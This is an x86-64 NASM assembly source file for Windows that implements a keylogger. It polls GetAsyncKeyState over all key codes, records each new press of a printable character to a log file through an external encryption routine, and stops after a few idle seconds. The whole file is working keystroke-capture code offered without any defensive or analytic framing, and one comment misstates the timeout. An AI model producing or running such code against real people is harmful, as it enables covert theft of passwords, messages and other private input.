BITS 64

section .data
    debug_finished db "Finished", 10, 0
    start db "Start", 10, 0
    elapsed_msg db "Elapsed: %u ms", 10, 0
    key_state times 256 db 0

section .text
    global main
    extern file_make, encrypt_and_put, printf, exit, fclose
    extern GetAsyncKeyState, GetTickCount64, Sleep

main:
    push rbx
    push rsi
    push rdi
    push r12
    sub rsp, 40

    ; start message
    lea rcx, [rel start]
    call printf

    ; Get start time
    call GetTickCount64
    mov rsi, rax        ; put in rsi
    
    ; Create log file
    call file_make
    mov rdi, rax        ;make the file and store the point
    test rdi, rdi       ; if file didnt open
    jz .exit

    mov rbx, rsi        ; transfer rsi (time) into rbx
    lea r13, [rel key_state]
    
.main_loop:
    xor r12d, r12d      ; counter for key loop
    
.key_loop:
    mov rcx, r12
    call GetAsyncKeyState
    test ax, 0x8000
    jz .key_not_pressed      ; Key not pressed

    cmp byte [r13 + r12], 0 ;if Key is pressed - check if it's new press
    jne .next_key

    mov byte [r13 + r12], 1 ; if its not, mark key as pressed
    ; Only log printable keys (0x20-0x7E)
    cmp r12 , 0x20
    jb .next_key
    cmp r12 , 0x7E
    ja .next_key
    
    call GetTickCount64 ; Update last press time
    mov rbx, rax
    
    mov rcx, r12         ; char value
    mov rdx, rdi         ; File pointer
    call encrypt_and_put ; call encryption
    jmp .next_key

.key_not_pressed:
    mov byte [r13 + r12], 0 ; release key

.next_key:
    inc r12
    cmp r12, 256
    jb .key_loop
    

    call GetTickCount64 ; Check if 3 seconds passed since last key
    sub rax, rbx        ; Current time - last press time
    cmp rax, 5000       ; 5000 ms = 5 seconds
    jb .continue
    
    jmp .close_file ; Exit if no key pressed for 3 or more seconds

.continue:
    mov rcx, 50
    call Sleep ; wait between the checks
    jmp .main_loop

.close_file:
    mov rcx, rdi
    call fclose

.exit:
    lea rcx, [rel debug_finished]
    call printf
    
    add rsp, 40
    pop r12
    pop rdi
    pop rsi
    pop rbx
    xor eax, eax
    call exit